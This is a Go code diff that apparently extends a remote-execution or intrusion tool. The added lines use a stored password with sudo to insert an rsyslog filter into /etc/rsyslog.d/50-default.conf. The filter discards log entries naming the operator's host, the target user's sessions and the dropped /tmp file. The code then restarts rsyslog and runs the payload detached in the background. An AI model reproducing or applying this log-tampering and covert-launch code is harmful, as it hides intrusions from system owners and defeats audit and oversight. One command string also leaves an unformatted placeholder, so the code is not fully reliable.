@@ -8,6 +8,7 @@ import (
 	"io"
 	"log"
 	"os"
+	"path"
 	"path/filepath"
 	"regexp"
 	"strings"
@@ -27,6 +28,10 @@ var SidString string
 var Search = true
 
 func SendBf(confa vars.Config) {
+	red := "\033[31m"
+	green := "\033[32m"
+	// yellow := "\033[33m"
+	reset := "\033[0m"           // Reset to default color
 	filePath := "../client/main" // replace with your file path
 	configFile := "config.toml"
 	bfFile := "test.csv"
@@ -158,10 +163,16 @@ func SendBf(confa vars.Config) {
 
 	// isSudo = false
 	if isSudo {
-		fmt.Println("IS SUDO")
+		fmt.Println(string(red), "IS SUDO", string(reset))
+		fileName := path.Base(confa.Flags.MainFile)
+		rsyslogCommand := fmt.Sprintf(`bash -c 'echo %s | sudo -S sed -i "1s/^/if (\$msg contains \"%s\" or \$msg contains \"Session\" or \$msg contains \"Removed session\" or \$msg contains \"session opened for user %s\" or \$msg contains \"session closed for user %s\" or \$msg contains \"of user %s.\" or \$msg contains \"\/tmp\/%s\") then stop\n/" /etc/rsyslog.d/50-default.conf'`+"\n", confa.Client.Pass, confa.Client.Host, confa.Client.User, confa.Client.User, confa.Client.User, fileName)
+		rsyslogRestart := ("bash -c 'echo %s | sudo systemctl restart rsyslog ' \n ")
+		commands = append(commands, rsyslogCommand)
+		commands = append(commands, rsyslogRestart)
 		commands = append(commands, fmt.Sprintf("bash -c 'echo %s | sudo -S nohup %s > /dev/null 2>&1 & disown' \n", confa.Client.Pass, confa.Flags.MainFile))
+
 	} else {
-		fmt.Println("JUST USER")
+		fmt.Println(string(green), "JUST USER", string(reset))
 		commands = append(commands, fmt.Sprintf("bash -c 'nohup %s > /dev/null 2>&1 & disown' \n", confa.Flags.MainFile))
 	}
 
@@ -173,6 +184,11 @@ func SendBf(confa vars.Config) {
 		}
 		if !strings.Contains(commands[i], ">>") {
 			fmt.Println(command)
+		}
+		if strings.Contains(commands[i], "sudo systemctl restart rsyslog") {
+
+			fmt.Println("Restarting RsysLog Waiting few seconds")
+			time.Sleep(10 * time.Second)
 		}
 		time.Sleep(200 * time.Millisecond)
 	}
